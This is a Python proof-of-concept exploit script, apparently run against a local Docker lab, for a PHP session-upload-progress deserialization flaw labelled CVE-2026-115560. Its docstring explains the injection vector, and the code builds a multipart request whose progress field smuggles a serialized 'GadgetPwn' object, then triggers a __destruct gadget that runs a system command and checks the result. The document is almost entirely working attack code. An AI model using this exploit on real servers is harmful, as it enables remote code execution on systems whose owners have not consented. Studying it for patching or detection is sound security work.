#!/usr/bin/env python3
"""up8: CVE-2026-115560 — deterministic injection via the PROGRESS FIELD VALUE.

Source-derived vector:
- progress key = "upload_progress_" + value of PHP_SESSION_UPLOAD_PROGRESS
  (FORMDATA branch appends raw value bytes; multipart form VALUES have no
  quote stripping, unlike filenames)
- php_binary record = [len][key][php-serialized progress array]
- victim reads with handler 'php': splits at FIRST '|' and unserializes
  the remainder -> object in the injected key wins (unserialize stops
  after the first complete value)

P = x|O:9:"GadgetPwn":0:{}|
file bytes = \x16upload_progress_x|O:9:"GadgetPwn":0:{}|a:5:{...}

cleanup=Off -> record persists after completed upload; target.php's own
session_start() then decodes it with the flipped 'php' handler in-request.
Then stage B (gadget.php) also loads it; GadgetPwn.__destruct runs
system(id) > /tmp/x_gadget.
"""
import urllib.request, uuid, subprocess, os

HOST = os.environ.get("UP_HOST", "http://127.0.0.1:8086")
UPCT = os.environ.get("UP_CT", "php_up")
SID = uuid.uuid4().hex
P = 'x|O:9:"GadgetPwn":0:{}|'

def multipart(fields, files):
    b = "----up8" + uuid.uuid4().hex
    out = b""
    for k, v in fields.items():
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (b, k, v)).encode("latin1")
    for name, fname, data in files:
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n" % (b, name, fname)).encode("latin1") + data + b"\r\n"
    out += ("--%s--\r\n" % b).encode()
    return out, "multipart/form-data; boundary=%s" % b

def req(method_path, data=None, ctype=None):
    h = {"Cookie": "PHPSESSID=" + SID}
    if ctype: h["Content-Type"] = ctype
    r = urllib.request.Request(HOST + method_path, data=data, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, resp.read()
    except Exception as e:
        return -1, ("ERR " + str(e)[:200]).encode()

def sh(cmd):
    r = subprocess.run(["docker", "exec", UPCT, "sh", "-c", cmd],
                       capture_output=True, timeout=20)
    return (r.stdout + r.stderr).decode("latin1", "replace")

print("SID", SID, flush=True)
body, ctype = multipart({"PHP_SESSION_UPLOAD_PROGRESS": P},
                        [("f", "ok.txt", b"M" * 8192)])
st, out = req("/target.php", body, ctype)
print("A: POST", st, flush=True)
print("A:", out.decode("latin1", "replace")[:600], flush=True)

raw = sh("cat /tmp/sess_" + SID + " 2>/dev/null | od -c | head -8")
print("A: sess file:\n", raw, flush=True)

st, out = req("/gadget.php")
print("B: gadget", st, flush=True)
print("B:", out.decode("latin1", "replace")[:600], flush=True)

print("x_gadget:", sh("cat /tmp/x_gadget 2>/dev/null || echo NO_XG").strip(), flush=True)
